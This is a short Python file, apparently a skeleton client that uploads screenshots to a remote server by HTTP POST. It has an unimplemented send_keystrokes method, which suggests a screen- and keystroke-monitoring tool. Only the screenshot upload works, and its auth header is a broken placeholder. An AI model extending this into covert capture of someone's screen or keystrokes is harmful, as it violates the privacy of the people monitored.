import base64

import requests


class Server:
    def __init__(self, URL):
        self.URL = URL
    def send_screenshot(self, file):
        #make a POST request to my_server
        print("sending screenshooots!")
        file.seek(0)
        #files_string = base64.b64encode(file.read()).decode("utf-8")
        myobj = {'file': file}
        headers = {
            "Authorization": "Bearer {'api_key'}",  # Secure token-based authentication
            "Device-ID": 'some random device id'  # Custom header for the device ID
        }

        try:
            response = requests.post(self.URL, files = myobj, headers=headers)
            print(f"Server Response: {response.text}")
        except Exception as e:
            print("Some exception:")
            print(e)
            pass


    def send_keystrokes(self):
        pass

class ServerWithSocketIO:
    pass